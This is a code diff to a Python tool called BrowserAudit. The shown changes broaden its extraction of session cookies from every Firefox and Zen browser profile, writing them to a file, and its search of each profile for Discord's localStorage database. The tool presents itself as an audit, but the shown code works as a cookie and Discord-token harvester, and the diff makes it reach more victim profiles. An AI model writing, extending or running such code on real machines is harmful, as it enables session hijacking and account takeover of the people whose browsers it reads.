@@ -127,8 +127,9 @@ class BrowserAudit:
             return
 
         print(f"{self.COLORS['CYAN']}[*] Extracting Firefox cookies...{self.COLORS['RESET']}")
+        found = False
         try:
-            for subdir in profile_dir.glob("*default*/"):
+            for subdir in profile_dir.glob("*/"):
                 cookies_file = subdir / "cookies.sqlite"
                 if cookies_file.exists():
                     conn = sqlite3.connect(cookies_file)
@@ -143,8 +144,10 @@ class BrowserAudit:
                             f.write("-" * 60 + "\n\n")
 
                     conn.close()
+                    found = True
 
-            print(f"{self.COLORS['GREEN']}[OK] Firefox cookies extracted{self.COLORS['RESET']}\n")
+            if found:
+                print(f"{self.COLORS['GREEN']}[OK] Firefox cookies extracted{self.COLORS['RESET']}\n")
         except Exception as e:
             self.log("ERROR", f"Firefox extraction failed: {e}")
 
@@ -161,6 +164,7 @@ class BrowserAudit:
             return
 
         print(f"{self.COLORS['CYAN']}[*] Extracting Zen cookies...{self.COLORS['RESET']}")
+        found = False
         try:
             for profile_dir in zen_dir.glob("*/"):
                 cookies_file = profile_dir / "cookies.sqlite"
@@ -177,8 +181,10 @@ class BrowserAudit:
                             f.write("-" * 60 + "\n\n")
 
                     conn.close()
+                    found = True
 
-            print(f"{self.COLORS['GREEN']}[OK] Zen cookies extracted{self.COLORS['RESET']}\n")
+            if found:
+                print(f"{self.COLORS['GREEN']}[OK] Zen cookies extracted{self.COLORS['RESET']}\n")
         except Exception as e:
             self.log("ERROR", f"Zen extraction failed: {e}")
 
@@ -194,8 +200,14 @@ class BrowserAudit:
             zen_profiles = self.home / ".config/zen/Profiles" if not zen_profiles_alt.exists() else zen_profiles_alt
 
         found_any = False
+        profile_dirs = []
 
-        for profile_dir in list(firefox_profiles.glob("*/")) + list(zen_profiles.glob("*/")):
+        if firefox_profiles.exists():
+            profile_dirs.extend(firefox_profiles.glob("*/"))
+        if zen_profiles.exists():
+            profile_dirs.extend(zen_profiles.glob("*/"))
+
+        for profile_dir in profile_dirs:
             localStorage_path = profile_dir / "storage/default/https+++discord.com/ls/data.sqlite"
 
             if not localStorage_path.exists():
